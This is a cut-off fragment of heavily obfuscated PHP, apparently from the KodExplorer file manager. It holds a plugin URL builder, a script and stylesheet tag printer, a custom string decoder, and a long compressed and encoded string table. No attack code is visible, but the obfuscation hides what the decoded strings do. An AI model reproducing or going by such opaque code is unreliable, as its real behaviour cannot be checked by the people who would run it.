$eÓ«èÃ¦²[424] . $Eòùò¹Æä˜; if (substr($e‹á“»ÅğÜ, 0, 4) == $eÓ«èÃ¦²[154] || substr($e‹á“»ÅğÜ, 0, 2) == $eÓ«èÃ¦²[1145]) { $CÄ‘ÛÇ ¥ = $e‹á“»ÅğÜ . $eÓ«èÃ¦²[1359] . $E‰Û§ÙåÛ; } else { if ($cÏé˜Ìù¸ğ == $eÓ«èÃ¦²[43]) { $CÄ‘ÛÇ ¥ = $this->pluginHost . $e‹á“»ÅğÜ . $eÓ«èÃ¦²[1359] . $E‰Û§ÙåÛ; } else { if ($cÏé˜Ìù¸ğ === $eÓ«èÃ¦²[86]) { $CÄ‘ÛÇ ¥ = $this->pluginHost . $e‹á“»ÅğÜ; } else { if ($cÏé˜Ìù¸ğ == $eÓ«èÃ¦²[1360]) { $CÄ‘ÛÇ ¥ = STATIC_PATH . $e‹á“»ÅğÜ . $eÓ«èÃ¦²[1359] . $D¨”ĞÛ™Ê; } else { if ($cÏé˜Ìù¸ğ == $eÓ«èÃ¦²[1361]) { $CÄ‘ÛÇ ¥ = APP_HOST . $eÓ«èÃ¦²[1362] . $e‹á“»ÅğÜ . $eÓ«èÃ¦²[1359] . $D¨”ĞÛ™Ê; } else { if (isset($aáÏÌ›àÒñ[$cÏé˜Ìù¸ğ])) { $CÄ‘ÛÇ ¥ = $aáÏÌ›àÒñ[$cÏé˜Ìù¸ğ] . $e‹á“»ÅğÜ . $eÓ«èÃ¦²[1359] . $E‰Û§ÙåÛ; } } } } } } goto fòÎì‚Ûõ¦; A¶àè§¾±Ò: $eÓ«èÃ¦² =& $_SERVER[¨¤¼…´]; $aáÏÌ›àÒñ = $this->getConfig(); $D¨”ĞÛ™Ê = KOD_VERSION . $eÓ«èÃ¦²[101] . KOD_VERSION_BUILD; goto c“«ô›Œš ; eæê°Ó˜Ä­: } public function link($a¼Şö…Ÿëß = false, $F«Ï¼áè¸ = '') { $AŸ†ÛÔŞ¼¤ =& $_SERVER[¨¤¼…´]; if (!$a¼Şö…Ÿëß) { $this->link($AŸ†ÛÔŞ¼¤[1363], $AŸ†ÛÔŞ¼¤[1361]); $this->link($AŸ†ÛÔŞ¼¤[1364], $AŸ†ÛÔŞ¼¤[1360]); $this->link($AŸ†ÛÔŞ¼¤[1365], $AŸ†ÛÔŞ¼¤[1360]); $this->link($AŸ†ÛÔŞ¼¤[1366], $AŸ†ÛÔŞ¼¤[1360]); $this->link($AŸ†ÛÔŞ¼¤[1367], $AŸ†ÛÔŞ¼¤[1360]); return; } $c…êÄæÃĞÒ = $this->url($a¼Şö…Ÿëß, $F«Ï¼áè¸, !1); if (substr($a¼Şö…Ÿëß, -3) == $AŸ†ÛÔŞ¼¤[1368]) { echo $AŸ†ÛÔŞ¼¤[1369] . $c…êÄæÃĞÒ . $AŸ†ÛÔŞ¼¤[1370] . $AŸ†ÛÔŞ¼¤[14]; } else { if (substr($a¼Şö…Ÿëß, -4) == $AŸ†ÛÔŞ¼¤[1371]) { echo $AŸ†ÛÔŞ¼¤[1372] . $c…êÄæÃĞÒ . $AŸ†ÛÔŞ¼¤[1373] . $AŸ†ÛÔŞ¼¤[14]; } } } } goto EÅîºâ­²£; AÓæ”†ÚÈ: if (!function_exists('_kodDe')) { function _kodDe($A¤¡µèÕö™) { $A¤¡µèÕö™ = base64_decode($A¤¡µèÕö™); $aÎ…ÏÌš— = strlen($A¤¡µèÕö™); $Eº»ì“½ = ''; $f¦¼Ğ Îë… = ord($A¤¡µèÕö™[0]) - 30; for ($EÖ²¤™İšß = 1; $EÖ²¤™İšß < $aÎ…ÏÌš—; $EÖ²¤™İšß += 2) { if ($EÖ²¤™İšß + 1 < $aÎ…ÏÌš—) { $Eº»ì“½ .= chr(ord($A¤¡µèÕö™[$EÖ²¤™İšß + 1]) + $f¦¼Ğ Îë…); $Eº»ì“½ .= chr(ord($A¤¡µèÕö™[$EÖ²¤™İšß]) + $f¦¼Ğ Îë…); } else { $Eº»ì“½ .= chr(ord($A¤¡µèÕö™[$EÖ²¤™İšß]) + $f¦¼Ğ Îë…); } } return $Eº»ì“½; } } define("\250\244\274\205\264", "\232\372\254\361"); $_SERVER[¨¤¼…´] = explode("\174\1\174\3\174\2", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\175\11\174\33\305\365\60\345\50\220\22\312\221\176\100\201\262\70\11\261\35\35\216\355\134\116\354\104\266\145\133\104\266\24\111\216\223\130\216\262\222\126\322\306\222\126\331"."\x5d\x59\xb6\x93\x50\xae\x26\x40\x12\xee\x3b\xd0\x42\xb8\xdb\x12\xae\x70\x85\xab\x14\xca\x55\x28\x77\x21\xdc\x85\x1c\xd0\x72\x97\xb3\x14\xf8\xe6\x9e\xd9\x95\x4c\xdb\x3f\x3f\x1c\xcd\xbc\x79\x33\x3b\xc7\x9b\x37\x6f\x66\xde\x7b\xf3\x8f".base64_decode('M9dv++TJtetW/2j1Xqv3/Pj9y7/EIfC3z+of4/Ax6/fbA/23V25hd2DPaRPmHt781dRZI/VnD0/58Q==')."\xde\xca\xc6\x5b\x1f\x7e\xfd\xae\xb7\xae\xa9\xf9\xe0\x94\x5c\xf5\x9a\xee\x57\x37\x3e\xfc\xf1\x3b\x3\x23\xbf\x1a\xd8\xff\xa2\xcb\x2f\xc9\xee\x5e\xf3\x64\xe2\x9b\xdf\x7d\xfb\xf9\x77\xbb\x8e\x9e\x9c\xd9\xbc\xe7\x53\xc7\xdf\x78\xfa\x82"."\x5f\x7c\x75\xee\x2a\xe9\xc5\x89\xef\x1e\xb2\x78\xe0\xc6\xb\x8e\x6d\x19\x5c\x99\xcf\xbd\x74\xe1\x85\xf\xdf\x71\xc3\xaa\x2b\x1e\x3d\xa4\xd5\xf8\x68\x53\xba\xf8\xf4\x5b\xc1\xc1\xc2\x7d\xdf\xdf\xf8\x97\x37\x4e\x32\xde\x3d\xed\xb9\x2f"."\317\274\42\20\34\51\14\50\223\336\177\73\346\332\173\370\67\357\374\330\277\372\355\5\317\134\372\340\201\173\277\167\340\203\17\176\366\322\224\277\327\237\372\162\375\365\316\345\77\173\373\300\203\216\77\377\341\330"."\x23\x5f\x5f\xf2\xe5\x27\x77\x6d\x38\xf5\xb8\x96\xf8\xf6\x49\xce\x97\x7\x2f\xec\xd9\xde\xf8\xd4\xf6\xe1\x5f\xb7\x7f\x74\xc8\xa2\x77\xa5\xa9\xbf\x93\x3e\x99\xf3\xe3\x59\x47\x25\x1f\x3f\x74\xd3\xf8\x4f\xf7\x7f\xef\xce\xe4\x63\x1d\x8f".base64_decode('73v67m1Xf7hh01HjPtxQ/8myJYXjH15y3eHnn3bKhj80HTR3/mXf/vqtC0/85ILnCtuWndX3o+n69g==')."\x1d\xdf\x4d\xbf\x73\xd1\xdc\xd5\xa3\xcb\x1c\xff\xca\x5\xae\x3d\xe1\xad\xe7\xaa\x6e\xfc\x7a\xee\xa9\x4d\xf9\x1f\xcd\xa8\x6e\xfc\xfd\x8e\x8e\xbf\xf6\xdd\xbf\x63\x76\xf6\xaf\xf5\x33\x8e\x3e\xf7\xf0\x27\x7f\x7c\xcd\x1f\x9f\xdf\xfc\x87"."\x3b\x7f\xf5\xbb\x47\xf7\xb9\xe8\xea\x7\x7e\xf9\xd0\x6d\x3\x8f\xec\xb9\xc7\x1e\xb8\x7f\x9b\xf0\x8f\x94\xd7\x4c\x49\x19\x56\xd\xd3\xc0\x80\x84\x96\x4f\xa9\x69\x1c\x56\xf3\xf8\xd7\x8d\x7f\x62\x72\x4a\xcd\x2a\x61\x75\x54\xf1\xe5\x45"."\x8\xe\xc3\x50\x2c\xad\x98\x31\x50\x82\xa9\xe4\x69\x79\xad\x9e\xb0\xaf\x2d\x16\xf4\x44\xba\x70\x5c\x2e\x14\xdc\x72\xd1\xd4\xb2\x9a\x9c\x74\x15\x32\x5\xc\x1d\x87\x7f\x1a\x49\x1d\x32\x4a\x62\x30\x26\xc7\x35\xdd\x54\x92\x18\x54\xcc"."\147\325\374\40\41\23\364\257\261\62\253\232\344\333\261\236\100\44\26\356\15\6\275\241\110\214\264\117\114\317\151\111\22\52\310\272\234\43\125\53\50\272\1\32\56\26\27\53\150\5\45\157\201\160\100\122\66\345"."\270\154\220\222\332\133\143\355\336\240\77\260\44\26\131\22\364\22\214\170\154\145\121\321\107\160\14\5\303\246\254\233\21\65\247\60\214\222\316\352\325\352\355\364\365\110\221\220\247\47\354\151\213\370\2\75\30\334"."\x16\xe8\xee\xf6\x45\xca\xe1\xa1\x80\xdf\xdf\xea\x69\x5b\x50\x9e\x12\xc\x79\x3a\xbb\x3d\x12\xa8\x1f\x18\x4\x35\x9f\xd2\xaa\xa5\xe5\x38\x65\xb9\x54\x83\x3\x1d\xaa\x92\x25\x9d\x99\x97\x69\x75\xcc\x91\x2\x9\x45\x58\x8\x50\x44\xbe".base64_decode('mM3iSA8LkforKbmYJX3WLkYKupqTadMXKCMMSsYdjLmaT+CId9jUZQ4HNU7oSg4QDYaFvX5vW0SC1Q==')."\224\72\102\201\156\211\14\105\116\66\114\105\227\372\272\274\41\257\4\253\336\74\5\265\170\212\204\363\365\366\200\16\221\74\176\277\64\126\11\246\222\53\320\142\160\236\12\205\5\102\355\336\220\324\272\104\342\375".strrev('‡ä)ø!+‘lä†Æk*d±-J„'."\r".'& ıq¤bËØGG@‘#¡Á÷äùp!Czª…4ñ€¥ï-9rĞ”').base64_decode('/GoGIeCVal4tEmIlRWgam8ckUKTYCoXkQDaNzHAwWYdwsLkF/84hSHE4kYcU3Ywp+YSWVPOEKcwjUw==').base64_decode('jhCebGbadRXgkQI1V0IrjHRrQwJb8LNZltKySUXn8QLILqaQxgAWw3P3FHMiCosmMmo2qdPJ+UOY0w==')."\x48\xb1\x8a\x69\x82\x66\x18\xb4\xa6\xbd\x5\xc8\x84\xc2\x8a\x2e\xd4\xbe\x3\x14\x13\x28\x9a\x22\xb0\x88\xd0\x3a\x34\x3d\xd7\xe\x18\x0\xe9\x1d\x40\xf6\x6a\x6f\x85\x84\x41\x4a\xf8\x49\xa1\x53\x5c\x84\x8d\x56\xf7\x9f\xe4\xfc\x6e\xa0"."\177\76\370\247\206\360\324\50\251\132\106\311\146\143\312\260\102\46\110\56\71\335\240\265\167\33\161\65\357\6\20\34\365\5\142\31\331\310\164\47\247\307\120\56\312\252\223\312\60\347\247\174\2\107\55\4\14\373".base64_decode('u0czvQLDz2oJOSu2FIczplkIK/lkB2PwSa2URx1WUChXbndISalbWiJ1NalNlLoAraRGOMfLmLksCw==')."\321\326\62\230\301\200\346\60\241\211\52\22\127\206\115\322\111\322\234\104\106\326\301\360\65\27\315\224\163\26\133\110\262\152\102\66\125\55\357\326\22\246\142\72\15\123\127\144\122\132\325\34\11\122\4\234\301\265".base64_decode('OBedPW14eXJGdDlvpBTd6SXk3SSBfmYcjKK1q0ZBM1T4mSZJNk05kYGznxff/AP4Kly1lDJcTyKhGA==').strrev('Œ0'."\n".'ÏÌ†z1B¤›“9uqJÔ#»:•WU›eMLà&«kSÈ*ÓW@g%jÍ“Ó¬µÑf†').base64_decode('Tb7eJCVg1CHliobp1BXAflSw0JHB86Wc3XA8VSXpDAMuTcANdY0SICOJpmFoVyQSjPk6wGLc4411ew==').strrev('|ä†tÁhö"ƒ©4]†×-A¤šG[‡ÁÑIZƒˆúÖ„ƒ”Á;’+/xÙÖšrš÷Édm"').base64_decode('9k98xFQIORpDaWuH+pV82szQjGFvaJE3FAsHOiJ9nhBZxvNgIIbpp2DRWWdISYKuT5g0n1yAvUZx4A==').base64_decode('RIFjTFPh5KFpfl8n7Jh2pwGQnCIWLduv5lRYd5OloJ4Ea3wnqZAbNag5mqmtjian1jjBv7U1/dF2Vw==').strrev('!ëÁ| WHŞİbG'."\r".'ëØ]ä00ë­¹¦MpĞ?IÔa—F‘+9T: ¤3uõI¦¹§¸óÊ·<Àí').base64_decode('Ib+GpyZtUT/+GXBxbg3G3JeT00CYTGkcCmPdmq5YIXxd6FOTdMmA0S5FTWdI+1RYWgJIlrqchVyNEg==')."\xb1\x42\x39\x4b\x5a\x4d\x91\xf1\xc1\xc\x94\x47\xc2\x6a\xae\x40\xf9\x9c\x99\x29\xe6\xe2\x42\xd0\xcd\xab\x42\xbe\xb\x46\x9e\x71\x37\x8d\x2d\x65\x40\x5a\x25\x8b\xba\x9b\x64\x99\x5c\xdf\x41\x79\xb6\x3b\xdc\x0\xfe\xe7\xc\x3a\xa9\xe5".strrev('AWuˆm)Ù”(É~Ğ«%I–´n¬Š•IÂ˜­Ò‚q¢\\ğ¡ÔÑµó"—JKZ À1$¯ù£^*d')."\127\122\52\41\177\40\226\1\70\147\346\252\21\2\231\240\230\104\343\175\120\232\345\0\223\363\175\331\340\153\7\214\10\13\174\107\257\337\37\153\13\364\104\200\104\213\41\175\41\137\304\113\11\313\323\36\363\264"."\5\331\112\310\207\211\40\300\131\136\316\45\61\144\250\136\130\76\370\72\303\71\67\135\57\41\147\306\141\300\122\13\132\336\120\234\144\347\342\114\162\36\216\61\346\330\30\170\131\16\56\107\17\73\345\334\250\63"."\247\230\262\223\125\335\272\114\112\21\161\265\365\221\41\340\74\67\13\326\146\260\115\241\353\163\60\20\46\31\346\101\50\20\152\342\212\116\352\21\354\45\111\71\141\370\73\275\21\272\266\312\104\362\361\364\205\51"."\xa3\x2c\x2\x44\x5d\x1d\x95\x79\xe3\xe6\xd1\x8a\x90\x42\x87\x73\x59\x2e\xa0\xc5\x54\xcb\xc0\xc5\xb4\xf8\xa\xc0\x5\x1\xb5\xc9\x95\x9a\xeb\xe4\x83\x14\xe9\xf2\xf5\x2c\x88\x75\x7\xda\xbd\xfe\x98\xaf\x7\x70\x99\x48\x39\xbc\x37\xd8"."\356\241\243\56\302\133\3\164\267\110\240\275\200\317\54\362\370\175\166\164\357\142\137\70\22\256\230\4\140\275\136\133\12\330\262\5\103\336\16\337\142\26\355\360\171\375\355\341\130\233\247\255\213\343\364\170\272\111"."\44\226\202\233\46\303\155\305\217\1\206\31\146\133\257\330\20\334\106\152\154\107\54\356\163\142\124\202\217\161\2\1\213\237\102\210\222\64\27\156\136\121\113\210\114\235\320\212\224\114\231\20\230\243\234\41\47\223"."\xa9\x29\xd3\x85\xad\x1a\xff\xd4\x48\x9e\xb0\x64\x16\x62\x8c\x7\xc4\x47\x58\x10\x35\x83\xc6\x81\xb8\x47\xbe\x2f\x11\xe6\x5d\x56\x83\x18\xc4\x69\x55\x52\x8c\xf\x57\x6\x78\x52\x26\x23\xc\x5b\x1c\x4c\x18\x9e\x6\x46\xc0\x83\x76\xc9".base64_decode('gBLQiMToJDTA/sJDq5PiO9RYAGzlPXB/G+sLBXo6SYZSRqEV8JHur6bCENnmmpwXAUlG5kIp7fQVGg==')."\xed\xca\xd5\xf8\xe7\x38\xfc\x3\x84\x3f\xf2\x71\x25\x4f\x7b\x3d\xe\x39\x32\xe3\x18\x74\xf\x3\x66\xb\xe5\xa6\x5a\x91\x7d\x2d\xae\x69\x59\x3a\x81\xc1\x7a\xce\x18\x5\xdb\x20\xaf\x30\x28\x91\xc\x53\xae\x34\x95\x2e\x50\x64\x55\x88"."\x4\x16\x78\x7b\x62\x94\xb2\x70\x4c\xa0\x46\xc\x0\x5b\xce\x40\x88\x74\x88\xa9\xd\xd2\xd\x10\x4e\xc\x79\xc3\x74\xfa\xeb\xca\xca\xa2\x4a\xbb\xcb\xed\x9a\x4a\xa8\x58\x1\xb\xf\xf9\xbc\x7b\x59\xb4\x34\xb5\xba\xdf\x39\xd5\x35\x0"."\x2\x35\xb5\xf3\x71\x94\xc4\xa2\x2e\x4b\x74\x12\xc9\x5f\xd4\x59\x6e\x28\xe6\x54\x1b\xf3\x6a\x9a\xa2\xee\xa8\xbb\x7a\x5e\x53\xbf\xc7\x39\x2a\x3b\x47\xeb\x9c\xb3\x9d\x3\x53\xa3\xae\x9a\xa9\x4\x30\xb0\xaa\xde\xd1\xb8\x6\x22\x0\xc4"."\171\23\7\300\117\163\164\336\344\250\363\270\23\226\317\357\217\16\114\151\232\172\154\324\65\61\132\32\250\255\231\107\277\223\50\352\140\163\227\30\141\125\115\116\255\6\125\2\342\17\103\311\43\136\50\40\320\204"."\121\265\300\241\253\146\254\241\160\60\206\112\232\347\350\167\106\247\16\314\23\362\11\40\373\267\200\350\3\30\163\206\341\171\234\113\141\313\130\126\70\357\11\175\24\363\11\316\135\341\274\210\313\11\302\7\324\164"."\236\115\41\260\222\263\115\265\125\352\136\65\31\377\256\241\3\231\126\350\172\14\117\347\164\102\235\305\274\272\222\36\25\344\225\225\44\240\231\224\276\343\212\131\122\50\171\0\270\45\16\210\203\156\373\100\222\20"."\313\42\41\217\174\201\157\267\24\264\367\40\255\50\304\240\204\125\142\261\244\222\47\343\264\77\301\66\22\162\101\11\13\55\214\305\42\236\126\277\67\106\71\14\341\304\64\216\270\142\53\73\134\3\115\343\34\225"."\362\207\4\27\271\215\225\131\11\61\3\111\321\165\115\157\102\307\230\106\261\0\205\60\260\353\62\101\177\112\140\53\56\65\267\110\270\233\11\227\210\211\235\136\220\251\30\1\167\307\114\64\160\127\107\243\305\176"."\x25\x39\xd0\xf\x8\x59\x76\xa6\x6\x56\x35\xac\xa9\xa1\x52\xb6\x3b\xa\xfe\xa3\x11\xcc\xbf\x48\x8d\xb\x7c\xfc\xc\x20\x64\x25\x4c\xb6\xe0\x96\x9d\x6f\xc5\x18\x7\x84\x55\x60\xc7\x14\x9a\xce\xd6\xd9\x82\x45\x2e\x36\x35\x53\xce\x32"."\64\230\26\201\20\312\155\350\132\115\366\370\170\0\375\234\11\301\325\131\70\375\103\34\262\207\35\155\261\23\13\341\340\11\300\34\102\264\271\212\62\350\74\230\2\155\174\171\362\265\73\311\360\171\26\73\175\104"."\364\147\1\225\112\227\62\230\310\46\205\32\132\121\117\50\14\307\42\136\230\262\16\126\53\56\314\101\261\113\70\230\4\165\166\300\23\14\7\134\115\35\100\300\163\300\55\200\203\13\251\16\176\370\340\140\42\247".base64_decode('g0iiDl46CfraHarRjiRiVC5KonU2M3Arn5VHHLj+fmVIyTpo7R20UQ7aAgfaq7ST2vQCyiC1QUHAHg==')."\62\16\70\20\160\124\151\51\60\110\273\201\311\321\16\56\143\73\322\272\126\54\4\351\227\204\30\256\14\1\360\232\62\100\110\323\114\7\335\74\71\312\367\125\260\72\74\264\210\17\65\257\75\133\70\111\23\210".base64_decode('MGGrA4bC9A55SBzgioOdtxIGP1/l54BcULLvPewHS7wTeSUicjosfN6U0/TbFVJxOKQkRhJ8P9MubA==').base64_decode('kKwxNvSIDisRU+WhZwTCaG3c/vtTyqZUw8jJQmxjUjdvU6DA1xrICsKAAwqTnYICnLcUydooGwkqxQ==')."\x94\xe8\xd\x87\x42\x61\x42\xfd\x69\xeb\x2d\xe5\xc2\x28\x9f\x99\xb4\x89\x12\x2c\xc0\x21\x70\x6b\x38\x3a\x4e\x3e\xc4\x42\x94\xfc\xa8\x5a\xc\xf7\x6b\x2c\xc7\xf6\x14\xac\xa3\x6d\x6c\x8\xf6\x7b\x50\xcd\x8f\xa8\x79\x71\xbb\xce\xa1\x9c"."\333\161\242\200\344\155\73\140\150\37\53\214\171\13\77\16\160\220\143\2\7\274\172\22\270\36\337\326\202\332\243\153\57\136\167\122\222\255\346\164\2\222\106\367\202\355\120\314\106\230\204\44\63\262\316\373\224\316"."\x28\x48\xc6\xfc\x10\x4\xa2\xf0\xa8\x80\x96\x92\x87\x38\x5b\xb7\xe4\x11\xe6\x81\x61\x8e\xb0\x73\xc\x21\x68\x2d\x14\x47\xdb\xc7\x8a\x74\xb1\x5d\x5e\xa5\xa8\x38\xc5\x54\xc3\xcf\xae\xed\xac\x61\xd4\xd2\x88\x56\x31\xa\xf\x11\x68\x58".strrev('+;H*yBøŒ\\Mü„é\\à»¨ÆÉ²@€ã?\\³–bÀaQ'."\0".'`;f>ùQ³€ X 2ïMôC').base64_decode('tLDsSuufnWnboLYo/6iF/ZQtUkQ6IcJoHSH+JNg2unTM4FxA/iCXRY46YZXjs3iVMWKYSo4wxDW23g==')."\61\301\376\46\56\353\56\35\324\210\127\224\257\14\104\372\50\62\300\200\35\3\27\357\327\250\60\14\147\205\67\251\232\20\2\231\232\106\217\253\70\242\300\355\31\114\50\20\165\211\253\154\14\262\352\40\311\345"."\x98\x6c\xc1\xac\xc4\xd0\x5d\xb5\x88\x7\xbb\xf8\x12\x24\x2e\x60\xe2\xb5\x14\x44\xe3\x2d\x87\xd7\x5c\x38\x24\x5c\xe8\xe6\xd8\xbd\x17\x2\xba\xc\x53\x2b\xf0\x14\x21\x8a\x93\x85\x24\x5e\xa8\x80\xc5\x3a\x1f\xd5\x10\x2c\x4\x49\x24\x26".strrev('='."\0".'É“’å:ğ»ÁEÅ¨¿ïp¸ÌbV˜qç@Â<n	t{µõj8C'."\0".'²»q1¡/$¸D.ğ').base64_decode('WBPD5ajicULlgtDdOStKiFVG92Sz/CLOHh8zC56rYiYRMma2DiQL0xPySjAm2nXYaIjPOH7RaZd8rQ==').base64_decode('zOc/SWVlM4APaOU45I8ZNa8YbIHSjQothpQ51jDBNOHAB+xvAEDk/exUg7MEYXlDS0XMtCzMIVSGQA==')."\252\226\336\7\123\3\367\144\207\256\345\174\1\100\372\225\351\301\216\247\320\163\35\304\157\206\325\112\15\5\343\7\27\210\261\312\244\311\254\50\276\232\234\374\233\67\317\376\4\7\57\46\237\51\46\62\53\251"."\12\15\370\27\376\242\60\127\151\372\325\142\125\173\355\221\43\72\236\235\27\177\364\226\267\256\177\366\322\125\353\273\7\206\157\137\267\365\271\343\177\327\74\351\353\214\377\200\165\17\115\276\175\322\272\5\7\336".base64_decode('fs9v7z88d+jutjMmFE/alnn2585n9sy9v4fzkEbP991Kzfeb2/7iCd0RfvXjv9xr3PvSP3/RtvXjow==')."\xb3\x57\xdc\xf6\xd1\xb3\xf\xbc\xe9\xbe\xf9\x98\x43\x5e\x76\x1d\x79\x77\xc3\x9a\x3\xe5\xf1\x7b\x2e\xfe\x6d\xdd\x13\xf\x3f\xd8\x54\x58\x9b\xf9\x7f\x57\x9e\x3d\xc1\x4c\xbe\x7d\xe2\x31\x33\xda\xb6\x3a\x5a\xaf\x98\xb0\xfe\x67\xe7\x2d"."\x6c\x3d\xe4\xa0\xf7\xdf\x9a\x3d\xee\xe5\xa3\xbe\xfa\xae\xee\xd3\x97\x5f\x2e\x6d\x3e\xfd\xf2\x23\xff\x3c\xf9\x8b\xef\x4f\x48\x3d\x34\xed\xff\x4d\xdc\xef\xa8\xce\xf5\xad\x13\x32\xa9\x1d\x9e\x8e\x57\xff\x38\x5c\xbb\xcf\x6f\xfc\x7b\xdf"."\171\131\141\174\127\366\375\351\357\251\367\357\347\257\232\321\172\324\310\251\13\16\77\370\250\375\146\337\372\366\270\357\366\175\150\331\211\121\377\331\57\74\343\131\135\263\301\154\332\331\171\312\36\216\333\237\271\345"."\xd8\x27\xe\x89\x4e\xf0\x7\x47\xf\x3e\xf3\xea\x3\xee\xd8\xb4\xf2\xa1\x9b\x9b\x67\x65\xce\x7a\xe4\x95\x7\x6f\xfe\xf3\x7e\x77\xe6\x9e\x9e\xbf\xfe\x64\xed\xeb\x3b\x27\xc7\x1e\x5f\x7f\xe0\x9e\xc7\xac\x7b\xed\xfc\x1f\x5d\x9a\x71\x49"."\xcf\x3c\x77\xf5\x96\x3b\x8f\xa9\x1d\xac\x5d\x3c\x27\xf7\xfb\xe6\xaf\x1e\xcf\x7d\xf0\x50\xef\x9\xfb\x7e\x7f\xd2\x95\xde\xe0\xc2\x75\x3b\xcf\x58\xa6\x9c\xff\x5e\xfb\x94\xc7\x22\x1b\x6e\x1d\xf7\xb3\x8e\x69\x67\xab\xab\xa2\x77\xbd\x7e"."\xc2\xfa\xf1\x1d\x89\xfc\x2b\xa9\xa6\x77\xbf\xf8\xf2\xe5\xe1\xdb\x5e\x7a\x33\xf3\xd9\x56\x47\x4d\xfa\xd5\x5f\xfd\x6d\xed\xed\xf1\xf1\xef\x6\x77\xff\xe1\x8c\x9e\xeb\x6e\x1b\x77\x72\xc7\x25\x27\x6f\x5c\x78\xd4\xf3\x6b\x7f\x7b\x65\x55".base64_decode('240vHq6kVhUGal48/9bHrznpzA+O7LgvtPCpqjuvHrn11JuXej//+QPbLwnM7V24YMX2vS87bJ/g3w==')."\36\356\370\347\236\137\44\242\247\316\376\375\54\343\315\336\317\307\355\34\130\173\311\267\7\136\73\174\224\367\240\315\165\23\176\337\32\272\341\302\27\153\117\374\307\222\111\207\275\34\170\372\100\337\243\103\127\237"."\x15\x38\x6d\xde\xd\x47\x14\x83\x37\x2c\xfa\xfa\x8b\xbf\xde\xbf\xd7\x85\xd5\xcb\x83\x6e\x29\xf3\xb7\xdc\x9\xb7\xcf\xf1\x36\x5c\x73\xc0\xfa\x9b\x17\xef\x5a\xfa\x7e\x68\xb8\xb0\xee\xcc\xb\x8f\xf5\xe4\xe7\x1d\x7c\x79\xe7\xe4\xb7\xf7"."\70\360\274\153\232\337\332\374\376\275\277\152\335\162\372\272\263\237\335\172\320\145\63\46\277\262\374\360\213\277\371\321\257\32\167\224\276\222\16\330\75\253\156\355\71\17\335\171\327\143\353\137\176\154\153\315\307\333".base64_decode('LvvHZa1P7nvoCw/Vh/Y5Xb/skPd/A+bBYbuu7Za9M16vcr10ZtXFPz9z4zk/yabv/cw74YgtH2x0Tg==').base64_decode('2rrpmYM+XXf4eRH5EOmFLxX/Uml+4t71Pz/wqbbEtgtnz/rxeac6th731wtzh799/bpd+77wwdHvHw==')."\xfe\xc7\x93\x2e\x7b\xe1\xe3\x6f\x27\x3c\x7b\xc4\xeb\xe3\xe7\x7\xf7\xdd\xb7\xf1\x5f\x5f\x1d\xf5\x74\xf3\xbe\x7b\xbd\x73\xd2\x7\x5f\x66\x5f\xfa\xcb\x48\xe6\xb4\xb7\xe\x69\x5a\xe2\xbb\x6d\xc7\xb5\xa7\x9c\x78\x5a\xfe\x27\x4f\xd7\x9c"."\26\174\372\213\153\107\236\330\262\360\251\352\43\156\112\157\75\247\361\211\177\217\123\176\163\317\314\355\257\17\255\271\165\365\363\323\67\255\74\341\201\63\156\170\341\320\15\35\27\74\332\267\373\236\103\246\36\264"."\352\332\346\277\375\343\264\203\136\335\264\141\326\121\335\7\315\276\373\325\355\27\167\46\76\334\357\67\77\172\263\307\337\374\110\170\307\300\344\221\163\57\334\143\355\272\225\367\376\365\311\307\116\274\341\226\165\107"."\x14\x6\x2e\x9f\xb2\xef\x99\xd9\xf8\xe5\x4a\xe8\x8e\x4b\xf6\x5f\xde\xbd\x76\xfb\x8b\x37\xde\xf2\xa7\x2f\x9c\xe\x7d\xc7\x8b\x5f\x4f\x38\x72\xf5\xb1\x8f\xff\xe2\x88\xa3\x17\xf\x34\x2d\xb8\xcd\x7f\xee\x7b\x6f\xde\x7a\xc9\xb2\xe7\x77"."\x3e\xfe\xd2\xcf\xfe\xf2\x66\x66\xc3\xb6\xee\xdc\x3\xd3\xde\x78\xe2\xd2\xf0\x57\x17\x3f\xdb\x13\x3c\x28\xe4\xca\x7d\x74\xea\x53\xc5\x83\x36\x2f\xf5\xb6\xfd\xe2\x7c\xdf\x89\xb7\x5e\x7b\xcf\xb6\x5f\x9f\x6e\x74\x86\xd6\xcd\xd4\x3f\x73".base64_decode('HrT0poPffvmtYw+Y23ZV8fRtgZ+fOt4x8vHh+6xdWHvVIc/1Hvz62gOcJ9x4Ye7Q+BGq5+hXXU8c3A==')."\xd8\x5a\xf3\xf3\xbf\x9d\xfb\xaa\x7c\xd9\x41\x77\x3d\x73\xe3\xeb\x1f\xfe\xfa\xaf\xef\x7e\xfe\xaf\xce\xa5\x77\x3e\x9d\xe9\xfc\x60\x7c\xee\xe5\x8f\xce\x6a\x98\x11\xa8\x3d\x69\xaf\x53\x6f\x9e\xe6\x3c\xf4\xe6\x37\xf6\x3e\xfc\x89\x6d\xe3"."\152\327\56\71\176\146\120\331\76\351\305\246\347\73\47\35\175\306\224\363\102\223\276\174\170\363\231\336\47\37\376\340\340\163\136\331\357\2\343\225\233\277\235\170\155\165\351\276\33\236\76\173\317\63\306\55\336\375".strrev('¼{¡ıs0º_ãTyİç©‚ËsŒöß›–ı»ˆtÛN„tÎäíöœûU°ôCwí–›ªM×ü[>ëQé')."\71\364\314\131\375\177\330\270\263\177\221\363\375\315\167\45\357\125\266\173\367\176\377\12\145\303\256\217\347\334\161\365\317\336\272\135\371\350\236\213\226\152\175\123\277\70\322\73\364\343\332\327\206\267\327\215\77\273"."\161\373\121\213\177\175\140\357\213\363\107\7\242\65\23\67\134\233\163\176\21\331\126\30\277\317\217\16\334\362\317\177\114\354\237\264\377\233\201\333\257\74\357\27\357\74\276\60\344\70\177\307\23\307\236\162\300\246".strrev('¯ÿ]Z«íÁÿ¼V××şœÅì÷ß¯	